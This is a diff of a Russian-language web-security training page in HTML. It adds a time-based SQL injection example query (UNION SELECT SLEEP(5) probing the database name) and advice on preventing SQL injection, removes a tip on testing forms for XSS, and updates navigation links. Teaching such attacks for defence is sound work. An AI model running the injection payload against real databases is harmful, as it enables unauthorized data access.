+<div class="language-SQL highlight"><span class="filename">Time-Based SQLi</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;a%&#39;</span><span class="p">;</span><span class="c1">--&#39; LIMIT 1</span>
+</span></code></pre></div>
+<h3 id="sqli">Способы устранения возможности использования SQLi</h3>
+<p>Все описанные уязвимости могут быть легко купированы, если при разработке архитектуры приложения будут применены следующие простые правила:</p>
+<ol>
+<li>
+<p>Использование подготовленных параметризированных запросов.<br />
+    Передавать данные в запрос в явном виде - верная дорога к SQLi. Заранее подготовленные, параметризированные запросы не допустят изменение структуры запроса путем добавления в него комментариев или кавычек. Кроме того, использование таких запросов делать код более читаемым.</p>
+</li>
+<li>
+<p>Выполнять проверку входных данных.<br />
+    Разрешение вводить только допустимые символы исключит всякую вероятность передачи в запрос различных управляющих последовательностей.</p>
+</li>
+<li>Экранирование спецсимволов.<br />
+    В случае допустимости ввода спецсимволов в БД, их обязательно нужно экранировать, чтобы СУБД рассматривала их как простой текст.</li>
 </ol>
-<h3 id="xss_1">Рекомендации по поиску XSS</h3>
-<p>Первым делом - обращай внимание на формы. Пробуй вводить туда код скрипта, закрывающие теги, Смотри на результат через DevConsole.</p>
 
 
   
@@ -2371,7 +2461,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Нижний колонтитул" >
         
           
-          <a href="../Broken_Authentication/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Broken Authentication" rel="prev">
+          <a href="../SSRF/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Server-site request forgery" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -2380,20 +2470,20 @@
                 <span class="md-footer__direction">
                   Назад
                 </span>
-                Broken Authentication
+                Server-site request forgery
               </div>
             </div>
           </a>
         
         
           
-          <a href="../Injection/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Injections" rel="next">
+          <a href="../XML_External_Entity_%28Security_misconfiguration%29/" class="md-footer__link md-footer__link--next" aria-label="Вперед: XML External Entity XEE" rel="next">
             <div class="md-footer__title">
               <div class="md-ellipsis">
                 <span class="md-footer__direction">
                   Вперед
                 </span>
-                Injections
+                XML External Entity XEE
               </div>
             </div>
             <div class="md-footer__button md-icon">
